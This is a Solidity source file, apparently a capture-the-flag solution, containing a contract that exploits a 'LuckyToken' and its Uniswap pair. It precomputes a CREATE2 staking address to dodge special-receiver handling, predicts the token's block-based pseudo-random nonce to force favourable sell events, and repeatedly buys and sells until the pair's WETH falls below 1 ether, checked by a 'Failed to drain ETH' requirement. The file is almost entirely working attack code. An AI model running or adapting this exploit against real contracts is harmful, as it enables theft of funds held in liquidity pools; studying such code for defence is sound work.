// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "./interfaces/IUniswapV2Router01.sol";
import "./interfaces/IUniswapV2Pair.sol";
import "./interfaces/IUniswapV2Factory.sol";
import "./LuckyToken.sol";

contract MainContract {
    IUniswapV2Router01 constant ROUTER =
        IUniswapV2Router01(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    LuckyToken public token;
    IUniswapV2Pair public pair;

    constructor(address _token) payable {
        token = LuckyToken(_token);
        // Get the pair address
        address[] memory path = new address[](2);
        path[0] = ROUTER.WETH();
        path[1] = _token;
        pair = IUniswapV2Pair(
            IUniswapV2Factory(ROUTER.factory()).getPair(path[0], path[1])
        );
    }

    function _calculateNonce(
        address _s1,
        address _s2,
        uint256 _s3,
        uint256 _s4,
        uint256 _s5,
        bytes32 _s6
    ) public pure returns (uint256) {
        return
            uint256(keccak256(abi.encodePacked(_s1, _s2, _s3, _s4, _s5, _s6)));
    }

    function run() external {
        // Compute LockStaking address that will be deployed by TeamVault using CREATE2
        // When TeamVault.release() is called, msg.sender will be our contract address
        // TeamVault uses this as salt via getSalt() function
        bytes32 salt = bytes32(uint256(uint160(address(this))));
        bytes memory creationCode = type(LockStaking).creationCode;
        bytes memory constructorArgs = abi.encode(address(token), 12);
        bytes32 initCodeHash = keccak256(
            abi.encodePacked(creationCode, constructorArgs)
        );

        address lockStakingAddr = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xff),
                            address(token.teamVault()), // TeamVault is the deployer
                            salt, // our address as bytes32
                            initCodeHash // hash of contract code + constructor args
                        )
                    )
                )
            )
        );

        // Send some tokens to future LockStaking address to prevent it from becoming special receiver
        address[] memory path = new address[](2);
        path[0] = ROUTER.WETH();
        path[1] = address(token);
        ROUTER.swapExactETHForTokens{value: 0.0001 ether}(
            0,
            path,
            address(this),
            block.timestamp
        );
        token.transfer(0x60cF56B038847C51a0AF495c1aE467eE71d92Ad4, 2);

        // Trigger FIRE event multiple times to burn tokens
        for (uint j = 0; j < 11; j++) {
            token.transfer(address(0x1), 1);
        }

        // Now release tokens to LockStaking - it won't be special receiver since it has balance
        token.teamVault().release();

        for (uint i = 0; i < 100; i++) {
            // Check if we've drained enough ETH
            if (
                IERC20(ROUTER.WETH()).balanceOf(token.uniswapV2Pair()) < 1 ether
            ) {
                break;
            }

            // 1. Buy tokens with ETH
            uint256 ethBalance = address(this).balance;

            ROUTER.swapExactETHForTokens{value: ethBalance}(
                0,
                path,
                address(this),
                block.timestamp
            );

            // 2. Sell tokens for ETH and make sure we get ICE event
            uint256 tokenBalance = token.balanceOf(address(this));
            if (tokenBalance > 0) {
                // Find amount that gives us ICE event
                for (uint j = 0; j < 20; j++) {
                    uint256 tryAmount = tokenBalance - j;
                    uint256 newNonce = _calculateNonce(
                        address(this), // msg.sender
                        address(pair), // recipient
                        block.timestamp,
                        tryAmount,
                        token.nonce(),
                        blockhash(block.number - 1)
                    );

                    if (((newNonce % 101) & 1) == 0) {
                        // Found good amount, do the swap
                        address[] memory path2 = new address[](2);
                        path2[0] = address(token);
                        path2[1] = ROUTER.WETH();

                        token.approve(address(ROUTER), tryAmount);
                        ROUTER.swapExactTokensForETH(
                            tryAmount,
                            0, // Accept any amount of ETH
                            path2,
                            address(this),
                            block.timestamp
                        );
                        break;
                    }
                }
            }
        }
        require(
            IERC20(ROUTER.WETH()).balanceOf(token.uniswapV2Pair()) < 1 ether,
            "Failed to drain ETH"
        );
    }

    receive() external payable {}
}
